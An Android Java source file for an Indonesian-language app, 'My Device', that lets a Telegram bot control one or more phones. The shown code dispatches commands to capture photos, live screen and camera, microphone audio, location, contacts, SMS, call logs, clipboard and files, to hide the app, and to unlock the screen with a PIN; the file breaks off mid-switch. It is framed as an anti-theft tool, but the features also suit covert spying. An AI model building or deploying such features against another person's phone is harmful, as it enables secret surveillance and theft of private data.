package id.irvan.mydevice;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.pm.PackageInfo;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.hardware.camera2.CameraManager;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.StatFs;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;

/** Eksekusi perintah Telegram. Dipanggil dari worker thread PollService. */
public class Commands {

    // ---------- util ----------

    /** Target dispatch saat ini (di-set di awal handleText/handleCallback/handlePending). */
    static String dispatchTarget = "utama";
    /** Aksi terakhir untuk tombol "Ulangi". */
    static String lastTarget = "utama";
    static String lastAksi = "menu";
    static long lastMsgId = 0;

    /** true jika perintah ini untuk HP ini. */
    public static boolean forMe(Context ctx, String target) {
        if (target == null) return false;
        target = target.trim().toLowerCase();
        return target.equals("semua") || target.equals("all")
                || target.equals(Prefs.deviceId(ctx));
    }

    static void reply(Context ctx, long chatId, String text) {
        replyT(ctx, chatId, dispatchTarget, text);
    }

    static void replyT(Context ctx, long chatId, String target, String text) {
        try {
            TelegramApi.sendMessage(Prefs.token(ctx), chatId, text, afterMarkup(target));
        } catch (Exception ignored) {
        }
    }

    /** Tombol ringkas setelah command: ulangi / buka semua menu. */
    static JSONObject afterMarkup(String target) {
        try {
            JSONObject ulangi = new JSONObject();
            ulangi.put("text", "\uD83D\uDD01 Ulangi");
            ulangi.put("callback_data", "cmd:" + lastTarget + ":" + lastAksi);
            JSONObject menu = new JSONObject();
            menu.put("text", "\uD83C\uDFE0 Menu");
            menu.put("callback_data", "cmd:" + target + ":menu");
            JSONArray row = new JSONArray();
            row.put(ulangi);
            row.put(menu);
            JSONArray kb = new JSONArray();
            kb.put(row);
            JSONObject m = new JSONObject();
            m.put("inline_keyboard", kb);
            return m;
        } catch (Exception e) {
            return null;
        }
    }

    static void sayPlain(Context ctx, long chatId, String text) {
        try {
            TelegramApi.sendMessage(Prefs.token(ctx), chatId, text, null);
        } catch (Exception ignored) {
        }
    }

    /** Tombol setelah perintah selesai: ulangi perintah terakhir / buka menu. */
    static final String[][] MENU = {
            {"\uD83D\uDCF7 Foto", "foto"}, {"\uD83E\uDD33 Selfie", "selfie"},
            {"\uD83D\uDCCD Lokasi", "lokasi"}, {"\uD83D\uDD0B Baterai", "baterai"},
            {"\uD83D\uDD26 Senter", "senter"}, {"\u2728 Strobo", "strobo"},
            {"\uD83D\uDCF3 Getar", "getar"}, {"\uD83D\uDD0A Ngomong", "ngomong"},
            {"\uD83D\uDCAC Pesan", "pesan"}, {"\uD83D\uDD14 Notif", "notif"},
            {"\uD83C\uDFA4 Rekam", "rekam"}, {"\u23F9 Berhenti", "berhenti"},
            {"\uD83C\uDFA7 Volume", "volmenu"}, {"\u2600 Cerah", "cerahmenu"},
            {"\uD83D\uDCCB Clipboard", "clipboard"},
            {"\uD83D\uDC65 Kontak", "kontak"}, {"\u2709\uFE0F SMS", "sms"},
            {"\uD83D\uDCE9 Inbox", "inbox"}, {"\uD83D\uDCDE Telpon", "telpon"},
            {"\uD83D\uDCDE Riwayat", "riwayat"}, {"\uD83D\uDCF6 Sinyal", "sinyal"},
            {"\uD83D\uDCE1 Wifi", "wifi"}, {"\uD83D\uDD35 Bluetooth", "bt"},
            {"\uD83C\uDFA8 Sensor", "sensor"}, {"\uD83D\uDD0C USB", "usb"},
            {"\uD83D\uDC46 Biometrik", "sidikjari"}, {"\uD83D\uDCBE Penyimpanan", "penyimpanan"},
            {"\u2B07\uFE0F Download", "download"}, {"\u2139\uFE0F Info", "info"},
            {"\uD83D\uDD12 Kunci", "kunci"}, {"\uD83D\uDD11 Kunci PIN", "kuncipin"},
            {"\uD83D\uDCDD Lockscreen", "lockscreen"}, {"\uD83D\uDD13 Buka", "buka"},
            {"\uD83D\uDCF2 Daftar APK", "daftarapk"}, {"\uD83D\uDEAB Kunci APK", "lockapk"},
            {"\uD83D\uDD13 Buka Kunci APK", "bukapk"}, {"\uD83D\uDCE2 Cari HP", "findmy"},
            {"\u25B6\uFE0F Jalankan APK", "bukaapk"}, {"\uD83D\uDE48 Sembunyi", "sembunyi"},
            {"\uD83D\uDDBC\uFE0F Wallpaper", "wallpaper"}, {"\u23F0 Alarm", "alarm"},
            {"\uD83D\uDD3D Taskbar", "taskbar"},
            {"\u25C0\uFE0F Back", "navback"}, {"\uD83C\uDFE0\uFE0F Home", "navhome"},
            {"\u23F9\uFE0F Recent", "navrecent"}, {"\uD83D\uDD14 Bunyikan HP", "bunyi"},
            {"\uD83D\uDCF8 Screenshot", "screenshot"}, {"\uD83D\uDDA5\uFE0F Live Layar", "live"},
            {"\uD83D\uDCF7 Live Kamera", "livecam"},
            {"\u2B05\uFE0F Geser Kiri", "swipeleft"}, {"\u27A1\uFE0F Geser Kanan", "swiperight"},
            {"\uD83C\uDFA7 Dengarkan", "dengarkan"}, {"\uD83D\uDCA1 Nyalakan Layar", "layarnyala"},
            {"\uD83D\uDD17 Buka Link", "link"}, {"\uD83D\uDD22 Atur Tombol", "tombolmenu"},
            {"\u25B6\uFE0F YouTube", "youtube"},
            {"\uD83D\uDD14 Notifikasi", "notifpro"}, {"\uD83C\uDFA4 Mode Suara", "modesuara"},
            {"\uD83D\uDD04 Ganti HP", "__picker"},
    };

    /** Kategori menu utama: {label, id}. */
    static final String[][] MENU_CATS = {
            {"\uD83D\uDCF7 Kamera & Layar", "cam"},
            {"\uD83D\uDD12 Kunci & Keamanan", "lock"},
            {"\uD83D\uDD0A Suara", "sound"},
            {"\uD83D\uDCF1 Perangkat", "dev"},
            {"\uD83D\uDCAC Komunikasi", "com"},
            {"\uD83C\uDFAC Hiburan", "fun"},
            {"\u2699\uFE0F Pengaturan", "set"},
    };

    /** Item tiap kategori: {label, aksi}. */
    static String[][] catItems(String cat) {
        switch (cat) {
            case "cam":
                return new String[][]{
                        {"\uD83D\uDCF7 Foto", "foto"}, {"\uD83E\uDD33 Selfie", "selfie"},
                        {"\uD83D\uDCF7 Live Kamera", "livecam"}, {"\uD83D\uDCF8 Screenshot", "screenshot"},
                        {"\uD83D\uDDA5\uFE0F Live Layar", "live"}, {"\uD83C\uDFA4 Rekam", "rekam"},
                        {"\uD83C\uDFA7 Dengarkan", "dengarkan"},
                };
            case "lock":
                return new String[][]{
                        {"\uD83D\uDD12 Kunci", "kunci"}, {"\uD83D\uDD11 Kunci PIN", "kuncipin"},
                        {"\uD83D\uDEA8 HP Hilang", "hphilang"},
                        {"\uD83D\uDCDD Lockscreen", "lockscreen"}, {"\uD83D\uDD13 Buka", "buka"},
                        {"\uD83D\uDCF2 Daftar APK", "daftarapk"}, {"\uD83D\uDEAB Kunci APK", "lockapk"},
                        {"\uD83D\uDD13 Buka Kunci APK", "bukapk"}, {"\u25B6\uFE0F Jalankan APK", "bukaapk"},
                        {"\uD83D\uDE48 Sembunyi", "sembunyi"}, {"\uD83D\uDCE2 Cari HP", "findmy"},
                        {"\uD83D\uDCF8 Foto Penyusup", "fotopenyusup"},
                };
            case "sound":
                return new String[][]{
                        {"\uD83D\uDD0A Ngomong", "ngomong"}, {"\uD83D\uDD14 Bunyikan HP", "bunyi"},
                        {"\u23F0 Alarm", "alarm"}, {"\uD83D\uDCF3 Getar", "getar"},
                        {"\uD83C\uDFA7 Volume", "volmenu"}, {"\u23F9 Berhenti", "berhenti"},
                };
            case "dev":
                return new String[][]{
                        {"\uD83D\uDCCD Lokasi", "lokasi"}, {"\uD83D\uDD34 Live Lokasi", "lokasirt"},
                        {"\uD83D\uDD0B Baterai", "baterai"},
                        {"\uD83D\uDD26 Senter", "senter"}, {"\u2728 Strobo", "strobo"},
                        {"\u2139\uFE0F Info", "info"}, {"\uD83D\uDCF6 Sinyal", "sinyal"},
                        {"\uD83D\uDCE1 Wifi", "wifi"}, {"\uD83D\uDD35 Bluetooth", "bt"},
                        {"\uD83C\uDFA8 Sensor", "sensor"}, {"\uD83D\uDD0C USB", "usb"},
                        {"\uD83D\uDC46 Biometrik", "sidikjari"}, {"\uD83D\uDCBE Penyimpanan", "penyimpanan"},
                        {"\u2B07\uFE0F Download", "download"}, {"\uD83D\uDCA1 Nyalakan Layar", "layarnyala"},
                        {"\uD83D\uDD3D Taskbar", "taskbar"},
                        {"\u25C0\uFE0F Back", "navback"}, {"\uD83C\uDFE0\uFE0F Home", "navhome"},
                        {"\u23F9\uFE0F Recent", "navrecent"},
                        {"\u2B05\uFE0F Geser Kiri", "swipeleft"}, {"\u27A1\uFE0F Geser Kanan", "swiperight"},
                        {"\uD83D\uDCCB Clipboard", "clipboard"},
                        {"\uD83D\uDCC1 Ambil File", "ambil"}, {"\uD83D\uDCF8 Foto Terakhir", "ambilterakhir"},
                };
            case "com":
                return new String[][]{
                        {"\uD83D\uDCAC Pesan", "pesan"}, {"\uD83D\uDD14 Notif", "notif"},
                        {"\uD83D\uDC65 Kontak", "kontak"}, {"\u2709\uFE0F SMS", "sms"},
                        {"\uD83D\uDCE9 Inbox", "inbox"}, {"\uD83D\uDCDE Telpon", "telpon"},
                        {"\uD83D\uDCDE Riwayat", "riwayat"},
                };
            case "fun":
                return new String[][]{
                        {"\u25B6\uFE0F YouTube", "youtube"}, {"\uD83D\uDD17 Buka Link", "link"},
                        {"\uD83C\uDFA4 Karaoke", "karaoke"}, {"\uD83D\uDCDD Lirik", "lirik"},
                        {"\uD83C\uDFAC Nobar", "nobar"}, {"\uD83D\uDCDC Antri", "antri"},
                        {"\u23E9 Skip Iklan", "skipiklan"},
                        {"\uD83D\uDCDF Papan LED", "papan"}, {"\uD83D\uDD50 Jam", "jam"},
                        {"\u2699\uFE0F Set Papan", "papanset"},
                };
            case "set":
                return new String[][]{
                        {"\uD83D\uDD22 Atur Tombol", "tombolmenu"}, {"\uD83D\uDD14 Notifikasi", "notifpro"},
                        {"\uD83C\uDFA4 Mode Suara", "modesuara"}, {"\u2600 Cerah", "cerahmenu"},
                        {"\uD83D\uDDBC\uFE0F Wallpaper", "wallpaper"},
                        {"\uD83D\uDCF1 Nomor SMS", "setnomor"}, {"\u2699\uFE0F Setup", "setup"},
                };
            default:
                return new String[0][0];
        }
    }

    static String catLabel(String cat) {
        for (String[] c : MENU_CATS) if (c[1].equals(cat)) return c[0];
        return "Menu";
    }

    /** Keyboard inline 2 kolom untuk target tertentu. */
    /** Builder keyboard generik dari daftar {label, aksi}. */
    static JSONObject buildMenuKb(Context ctx, String target, String[][] items,
                                  String backAksi, int cols) {
        try {
            JSONArray kb = new JSONArray();
            JSONArray row = null;
            int col = 0;
            for (String[] it : items) {
                if (col == 0) {
                    row = new JSONArray();
                    kb.put(row);
                }
                JSONObject b = new JSONObject();
                b.put("text", it[0]);
                b.put("callback_data", "__picker".equals(it[1])
                        ? "dev:picker" : ("cmd:" + target + ":" + it[1]));
                row.put(b);
                col = (col + 1) % cols;
            }
            if (backAksi != null) {
                JSONArray rb = new JSONArray();
                JSONObject bb = new JSONObject();
                bb.put("text", "\u2B05\uFE0F Kembali");
                bb.put("callback_data", "cmd:" + target + ":" + backAksi);
                rb.put(bb);
                kb.put(rb);
            }
            JSONObject m = new JSONObject();
            m.put("inline_keyboard", kb);
            return m;
        } catch (Exception e) {
            return null;
        }
    }

    /** Menu utama: daftar kategori. */
    static JSONObject deviceMenuMarkup(Context ctx, String target) {
        try {
            JSONArray kb = new JSONArray();
            // baris paling atas: ulangi perintah terakhir
            try {
                JSONArray r0 = new JSONArray();
                JSONObject b0 = new JSONObject();
                b0.put("text", "\uD83D\uDD01 Ulangi perintah terakhir");
                b0.put("callback_data", "cmd:" + lastTarget + ":" + lastAksi);
                r0.put(b0);
                kb.put(r0);
            } catch (Exception ignored) {
            }
            String[][] cats = new String[MENU_CATS.length + 1][];
            for (int i = 0; i < MENU_CATS.length; i++) {
                cats[i] = new String[]{MENU_CATS[i][0], "cat:" + MENU_CATS[i][1]};
            }
            cats[MENU_CATS.length] = new String[]{"\uD83D\uDD04 Ganti HP", "__picker"};
            JSONObject inner = buildMenuKb(ctx, target, cats, null, Math.min(2, Prefs.btnCols(ctx)));
            if (inner == null) return null;
            JSONArray innerKb = inner.getJSONArray("inline_keyboard");
            for (int i = 0; i < innerKb.length(); i++) kb.put(innerKb.get(i));
            JSONObject m = new JSONObject();
            m.put("inline_keyboard", kb);
            return m;
        } catch (Exception e) {
            return null;
        }
    }

    /** Submenu satu kategori + tombol Kembali. */
    static JSONObject deviceCatMarkup(Context ctx, String target, String cat) {
        return buildMenuKb(ctx, target, catItems(cat), "menu", Prefs.btnCols(ctx));
    }

    /** Tampilkan submenu kategori (edit pesan bila bisa). */
    static void sendCatMenu(Context ctx, long chatId, long msgId, String target, String cat) {
        String teks = "\uD83D\uDCF1 [" + target + "] \u2014 " + catLabel(cat) + ":";
        try {
            if (msgId > 0) {
                try {
                    TelegramApi.editMessage(Prefs.token(ctx), chatId, msgId,
                            teks, deviceCatMarkup(ctx, target, cat));
                    return;
                } catch (Exception ignored) {
                }
            }
            TelegramApi.sendMessage(Prefs.token(ctx), chatId, teks, deviceCatMarkup(ctx, target, cat));
        } catch (Exception ignored) {
        }
    }

    /** Pemilih perangkat (2 kolom). */
    static JSONObject devicePickerMarkup(Context ctx) {
        try {
            JSONArray kb = new JSONArray();
            JSONArray row = null;
            int col = 0;
            for (String d : Prefs.deviceList(ctx)) {
                if (col == 0) {
                    row = new JSONArray();
                    kb.put(row);
                }
                JSONObject b = new JSONObject();
                b.put("text", "\uD83D\uDCF1 " + d);
                b.put("callback_data", "dev:" + d);
                row.put(b);
                col = (col + 1) % 2;
            }
            if (col == 0) {
                row = new JSONArray();
                kb.put(row);
            }
            JSONObject b = new JSONObject();
            b.put("text", "\uD83D\uDCF1 Semua HP");
            b.put("callback_data", "dev:semua");
            row.put(b);
            // baris: buat ID baru
            JSONArray row2 = new JSONArray();
            JSONObject nb = new JSONObject();
            nb.put("text", "➕ Buat ID baru");
            nb.put("callback_data", "dev:buatid");
            row2.put(nb);
            kb.put(row2);
            // baris: hapus ID
            JSONArray row3 = new JSONArray();
            JSONObject db = new JSONObject();
            db.put("text", "\uD83D\uDDD1\uFE0F Hapus ID");
            db.put("callback_data", "dev:hapusid");
            row3.put(db);
            kb.put(row3);
            JSONObject m = new JSONObject();
            m.put("inline_keyboard", kb);
            return m;
        } catch (Exception e) {
            return null;
        }
    }

    static void sendPicker(Context ctx, long chatId, long msgId) {
        String teks = "\uD83D\uDCF1 My Device \u2014 pilih HP yang mau dikontrol:";
        try {
            if (msgId > 0) {
                try {
                    TelegramApi.editMessage(Prefs.token(ctx), chatId, msgId,
                            teks, devicePickerMarkup(ctx));
                    return;
                } catch (Exception ignored) {
                }
            }
            TelegramApi.sendMessage(Prefs.token(ctx), chatId, teks, devicePickerMarkup(ctx));
        } catch (Exception ignored) {
        }
    }

    /** Keyboard daftar ID dengan tombol hapus. */
    static JSONObject deviceDeleteMarkup(Context ctx) {
        try {
            JSONArray kb = new JSONArray();
            for (String d : Prefs.deviceList(ctx)) {
                JSONArray row = new JSONArray();
                JSONObject b = new JSONObject();
                b.put("text", "\u274C " + d);
                b.put("callback_data", "dev:del:" + d);
                row.put(b);
                kb.put(row);
            }
            JSONArray row2 = new JSONArray();
            JSONObject back = new JSONObject();
            back.put("text", "\u2B05 Kembali");
            back.put("callback_data", "dev:picker");
            row2.put(back);
            kb.put(row2);
            JSONObject o = new JSONObject();
            o.put("inline_keyboard", kb);
            return o;
        } catch (Exception e) {
            return null;
        }
    }

    static void sendDeletePicker(Context ctx, long chatId, long msgId) {
        String teks = "\uD83D\uDDD1\uFE0F Pilih ID yang mau dihapus:";
        try {
            if (msgId > 0) {
                try {
                    TelegramApi.editMessage(Prefs.token(ctx), chatId, msgId,
                            teks, deviceDeleteMarkup(ctx));
                    return;
                } catch (Exception ignored) {
                }
            }
            TelegramApi.sendMessage(Prefs.token(ctx), chatId, teks, deviceDeleteMarkup(ctx));
        } catch (Exception ignored) {
        }
    }

    static void sendDeviceMenu(Context ctx, long chatId, long msgId, String target) {
        String teks = "\uD83D\uDCF1 [" + target + "] \u2014 pilih perintah:";
        try {
            if (msgId > 0) {
                try {
                    TelegramApi.editMessage(Prefs.token(ctx), chatId, msgId,
                            teks, deviceMenuMarkup(ctx, target));
                    return;
                } catch (Exception ignored) {
                }
            }
            TelegramApi.sendMessage(Prefs.token(ctx), chatId, teks, deviceMenuMarkup(ctx, target));
        } catch (Exception ignored) {
        }
    }

    static void runOnMain(Runnable r) {
        new Handler(Looper.getMainLooper()).post(r);
    }

    // ---------- dispatcher ----------

    // ---------- dispatcher (multi-perangkat) ----------

    public static void handleText(final Context ctx, final long chatId, String text) {
        String t = text.trim();
        // prefix target: "idperangkat: perintah"
        String target = null;
        java.util.regex.Matcher m = java.util.regex.Pattern
                .compile("^([A-Za-z0-9_\\-]+)\\s*:\\s*(.*)$", java.util.regex.Pattern.DOTALL)
                .matcher(t);
        if (m.matches() && Prefs.knownTarget(ctx, m.group(1))) {
            target = m.group(1).trim().toLowerCase();
            t = m.group(2).trim();
        }
        String[] parts = t.split(" ", 2);
        String cmd = parts[0].split("@")[0].toLowerCase();
        final String arg = parts.length > 1 ? parts[1].trim() : "";

        if (cmd.equals("/start") || cmd.equals("/menu")) {
            if (!Prefs.isMenuServer(ctx)) return;
            dispatchTarget = target != null ? target : Prefs.firstDevice(ctx);
            if (target != null && Prefs.knownTarget(ctx, target)) sendDeviceMenu(ctx, chatId, 0, target);
            else sendPicker(ctx, chatId, 0);
            return;
        }

        String effTarget = target != null ? target : Prefs.firstDevice(ctx);
        // catat target mode HP hilang (untuk routing voice note antar-HP)
        if (cmd.equals("/hphilang")) Prefs.setHilangTarget(ctx, effTarget);
        else if (cmd.equals("/berhenti")) Prefs.setHilangTarget(ctx, null);
        if (!forMe(ctx, effTarget)) return;
        dispatchTarget = effTarget;
        // perintah baru membatalkan input pending; teks biasa biarkan pending yang menangani
        if (cmd.startsWith("/") || target != null) PollService.pending.remove(chatId);
        else if (PollService.pending.containsKey(chatId)) return;
        execAction(ctx, chatId, effTarget, cmd.startsWith("/") ? cmd.substring(1) : cmd, arg);
    }

    /** Input lanjutan setelah tombol yang butuh teks (pending). Nilai: "target:aksi". */
    public static void handlePending(Context ctx, long chatId, String target, String action, String text) {
        if (!forMe(ctx, target)) return;
        dispatchTarget = target;
        lastTarget = target;
        lastAksi = action;
        if (action.startsWith("tubemin:")) {
            doTubeGo(ctx, chatId, target, action.substring(8), -2, text);
            return;
        }
        if (action.startsWith("hilangteksset:")) {
            if (handleHilangTeksPending(ctx, chatId, target, action, text)) return;
        }
        switch (action) {
            case "ngomong": doNgomong(ctx, chatId, target, text); break;
            case "toast": doToast(ctx, chatId, target, text); break;
            case "notif": doNotif(ctx, chatId, target, text); break;
            case "sms": doSms(ctx, chatId, target, text); break;
            case "telpon": doTelpon(ctx, chatId, target, text); break;
            case "download": doDownload(ctx, chatId, target, text); break;
            case "lockscreen": doLockscreen(ctx, chatId, target, text); break;
            case "lockapk": doLockApk(ctx, chatId, target, text, true); break;
            case "bukapk": doLockApk(ctx, chatId, target, text, false); break;
            case "kuncipin": doKunciPin(ctx, chatId, target, text); break;
            case "hphilang": doHphilang(ctx, chatId, target, text); break;
            case "pesan": doPesan(ctx, chatId, target, text); break;
            case "clipset": doClipSet(ctx, chatId, target, text); break;
            case "clipboard": doClipSet(ctx, chatId, target, text); break;
            case "bukaapk": doBukaApk(ctx, chatId, target, text); break;
            case "link": doLink(ctx, chatId, target, text); break;
            case "layarnyala":
                doLayarNyala(ctx, chatId, target, "-".equals(text.trim()) ? "" : text);
                break;
            case "pinpos": doPinPos(ctx, chatId, target, text); break;
            case "tespin": doTesPin(ctx, chatId, target, text); break;
            case "kalibrasi1": handleKalibrasi1(ctx, chatId, target, text); break;
            case "kalibrasi2": handleKalibrasi2(ctx, chatId, target, text); break;
            case "kalibrasi3": handleKalibrasi3(ctx, chatId, target, text); break;
            case "notifchat":
                replyT(ctx, chatId, target, "Forward satu pesan dari channel/grup notifikasi ke chat ini — bukan kirim teks biasa.");
                break;
            case "karaoke": doKaraoke(ctx, chatId, target, text); break;
            case "lirik": doLirik(ctx, chatId, target, text); break;
            case "nobar": doNobar(ctx, chatId, target, text); break;
            case "papan": doPapan(ctx, chatId, target, text); break;
            case "ambil": doAmbil(ctx, chatId, target, text); break;
            case "setnomor": doSetNomor(ctx, chatId, target, text); break;
            case "youtube": {
                String pkg = tubePkg.get(chatId);
                if (pkg == null) {
                    replyT(ctx, chatId, target, "Sesi YouTube kedaluwarsa — ketik /youtube lagi.");
                } else {
                    doTubeSearch(ctx, chatId, target, pkg, text);
                }
                break;
            }
            case "wallpaper":
                replyT(ctx, chatId, target, "Kirim FOTO (bukan teks) ke bot untuk dijadikan wallpaper.");
                break;
            case "alarm": doAlarm(ctx, chatId, target, text); break;
            default: break;
        }
    }

    public static void handleCallback(final Context ctx, final long chatId, final long msgId, String data) {
        try {
            if (data.equals("dev:picker") || data.equals("cmd:menu")) {
                if (!Prefs.isMenuServer(ctx)) return;
                sendPicker(ctx, chatId, msgId);
                return;
            }
            if (data.startsWith("dev:")) {
                if (!Prefs.isMenuServer(ctx)) return;
                String dev = data.substring(4).toLowerCase();
                if (dev.equals("buatid")) {
                    execAction(ctx, chatId, Prefs.firstDevice(ctx), "buatid", "");
                    return;
                }
                if (dev.equals("hapusid")) {
                    sendDeletePicker(ctx, chatId, msgId);
                    return;
                }
                if (dev.startsWith("del:")) {
                    String hapus = dev.substring(4);
                    if (hapus.equals(Prefs.deviceId(ctx))) {
                        sayPlain(ctx, chatId, "Tidak bisa hapus ID HP ini sendiri — ganti ID di aplikasi HP itu.");
                    } else if (Prefs.removeDevice(ctx, hapus)) {
                        sayPlain(ctx, chatId, "\uD83D\uDDD1\uFE0F ID [" + hapus + "] dihapus dari daftar.");
                    }
                    sendDeletePicker(ctx, chatId, msgId);
                    return;
                }
                if (!Prefs.knownTarget(ctx, dev)) return;
                sendDeviceMenu(ctx, chatId, msgId, dev);
                return;
            }
            if (data.startsWith("cmd:")) {
                String[] pr = data.substring(4).split(":", 2);
                if (pr.length < 2) return;
                String target = pr[0].toLowerCase();
                String aksi = pr[1];
                if (!forMe(ctx, target)) return;
                dispatchTarget = target;
                lastMsgId = msgId;
                execAction(ctx, chatId, target, aksi, "");
            }
        } catch (Exception ignored) {
        }
    }

    /** Eksekusi satu aksi untuk target tertentu. */
    static void execAction(final Context ctx, final long chatId, final String target,
                           String aksi, final String arg) {
        lastTarget = target;
        lastAksi = aksi;
        if (aksi.startsWith("cat:")) {
            sendCatMenu(ctx, chatId, lastMsgId, target, aksi.substring(4));
            return;
        }
        if (aksi.startsWith("btpair:")) {
            BtHelper.pair(ctx, chatId, target, aksi.substring(7));
            return;
        }
        if (aksi.startsWith("nobarplay:")) {
            doNobarPlay(ctx, chatId, target, aksi.substring(10));
            return;
        }
        if (aksi.startsWith("nobarvid:")) {
            doNobarPlayId(ctx, chatId, target, aksi.substring(9));
            return;
        }
        if (aksi.startsWith("karaplay:")) {
            doKaraPlay(ctx, chatId, target, aksi.substring(9));
            return;
        }
        if (aksi.startsWith("antriadd:")) {
            doAntriAdd(ctx, chatId, target, aksi.substring(9));
            return;
        }
        if (aksi.startsWith("antriplay:")) {
            doAntriJump(ctx, chatId, target, aksi.substring(10));
            return;
        }
        if (aksi.startsWith("antridel:")) {
            doAntriDel(ctx, chatId, target, aksi.substring(9));
            return;
        }
        if (aksi.equals("antriclear")) {
            saveAntrean(ctx, target, new java.util.ArrayList<JSONObject>());
            antreanBatal();
            replyT(ctx, chatId, target, "\uD83D\uDDD1\uFE0F Antrean dikosongkan.");
            return;
        }
        if (aksi.equals("antrilist")) {
            doAntriList(ctx, chatId, target);
            return;
        }
        if (aksi.startsWith("hilangteks:")) {
            doHilangTeksSet(ctx, chatId, target, aksi.substring(11));
            return;
        }
        if (aksi.startsWith("papanset:")) {
            doPapanSet(ctx, chatId, target, aksi.substring(9));
            return;
        }
        if (aksi.startsWith("ambilf:")) {
            int idx = -1;
            try {
                idx = Integer.parseInt(aksi.substring(7));
            } catch (Exception ignored) {
            }
            java.util.List<java.io.File> lst = ambilCache.get(chatId + ":" + target);
            if (lst != null && idx >= 0 && idx < lst.size()) {
                kirimFile(ctx, chatId, target, lst.get(idx));
            } else {
                replyT(ctx, chatId, target, "Daftar file kedaluwarsa — /ambil lagi.");
            }
            return;
        }
        if (aksi.startsWith("hilang:")) {
            doHilangCtl(ctx, chatId, target, aksi.substring(7));
            return;
        }
        if (aksi.startsWith("kontakpg:")) {
            int pg = 0;
            try {
                pg = Integer.parseInt(aksi.substring(9));
            } catch (Exception ignored) {
            }
            doKontakPage(ctx, chatId, target, pg, lastMsgId);
            return;
        }
        if (aksi.startsWith("volset:")) {
            doVolSet(ctx, chatId, target, aksi.substring(7));
            return;
        }
        if (aksi.startsWith("cerahset:")) {
            doCerahSet(ctx, chatId, target, aksi.substring(9));
            return;
        }
        if (aksi.startsWith("tubeapp:")) {
            doTubeApp(ctx, chatId, target, aksi.substring(8));
            return;
        }
        if (aksi.startsWith("tubeplay:")) {
            doTubeCard(ctx, chatId, target, aksi.substring(9));
            return;
        }
        if (aksi.startsWith("tubego:")) {
            doTubeGo(ctx, chatId, target, aksi.substring(7), 0);
            return;
        }
        if (aksi.equals("tubeback") || aksi.equals("tubefwd") || aksi.equals("tubestop")
                || aksi.equals("tubepause") || aksi.equals("tuberesume")) {
            doTubeControl(ctx, chatId, target, aksi);
            return;
        }
        if (aksi.startsWith("tubemin:")) {
            doTubeMinAsk(ctx, chatId, target, aksi.substring(8));
            return;
        }
        if (aksi.startsWith("tuberel:")) {
            doTubeRel(ctx, chatId, target, aksi.substring(8));
            return;
        }
        if (aksi.equals("tubeplist")) {
            doTubePlaylist(ctx, chatId, target);
            return;
        }
        if (aksi.equals("tubesearch")) {
            doTubeSearchAsk(ctx, chatId, target);
            return;
        }
        if (aksi.startsWith("notifprom:")) {
            doNotifProMaster(ctx, chatId, target, "1".equals(aksi.substring(7)));
            return;
        }
        if (aksi.startsWith("notifprot:")) {
            doNotifProToggle(ctx, chatId, target, aksi.substring(7));
            return;
        }
        switch (aksi) {
            case "wallpaper": doWallpaper(ctx, chatId, target); break;
            case "alarm":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":alarm");
                    replyT(ctx, chatId, target, "\u23F0 Kirim jam alarm, contoh: 06:30 Bangun pagi\n(atau: list / hapus 06:30)");
                } else doAlarm(ctx, chatId, target, arg); break;
            case "taskbar": doTaskbar(ctx, chatId, target); break;
            case "navback": doNav(ctx, chatId, target, "back"); break;
            case "navhome": doNav(ctx, chatId, target, "home"); break;
            case "navrecent": doNav(ctx, chatId, target, "recent"); break;
            case "bunyi": doBunyi(ctx, chatId, target); break;
            case "screenshot": doScreenshot(ctx, chatId, target, 0); break;
            case "live": doLive(ctx, chatId, target); break;
            case "liveup": doLiveGesture(ctx, chatId, target, "up"); break;
            case "livedown": doLiveGesture(ctx, chatId, target, "down"); break;
            case "liveleft": doLiveGesture(ctx, chatId, target, "left"); break;
            case "liveright": doLiveGesture(ctx, chatId, target, "right"); break;
            case "livetap": doLiveGesture(ctx, chatId, target, "tap"); break;
            case "liveshot": doLiveShot(ctx, chatId, target); break;
            case "livex": liveMsg.remove(chatId); replyT(ctx, chatId, target, "Live layar ditutup."); break;
            case "dengarkan": doDengarkan(ctx, chatId, target); break;
            case "layarnyala":
                if (arg.isEmpty()) {
                    PollService.pending.put(chatId, target + ":layarnyala");
                    replyT(ctx, chatId, target, "\uD83D\uDCA1 Kirim PIN kunci layar HP [" + target + "]\n(contoh: 123456)\nKirim - jika hanya ingin menyalakan layar tanpa PIN.");
                } else doLayarNyala(ctx, chatId, target, arg);
                break;
            case "pinpos": doPinPos(ctx, chatId, target, arg); break;
            case "tespin": doTesPin(ctx, chatId, target, arg); break;
            case "kalibrasi": doKalibrasiStart(ctx, chatId, target); break;
            case "livecam": doLiveCam(ctx, chatId, target); break;
            case "livecamshot": doLiveCamShot(ctx, chatId, target); break;
            case "livecamswitch": doLiveCamSwitch(ctx, chatId, target); break;
            case "livecamx": liveCamMsg.remove(chatId); replyT(ctx, chatId, target, "Live kamera ditutup."); break;
            case "swipeleft": doSwipe(ctx, chatId, target, "left"); break;
            case "swiperight": doSwipe(ctx, chatId, target, "right"); break;
            case "tombol": doTombol(ctx, chatId, target, arg); break;
            case "youtube": doTubeStart(ctx, chatId, target, arg); break;
            case "notifpro": doNotifPro(ctx, chatId, target, arg); break;
            case "notifchat": doNotifProChat(ctx, chatId, target); break;
            case "modesuara": doVoiceMode(ctx, chatId, target, arg); break;
            case "tombolmenu": doTombolMenu(ctx, chatId, target); break;
            case "tombol1": doTombol(ctx, chatId, target, "1"); break;
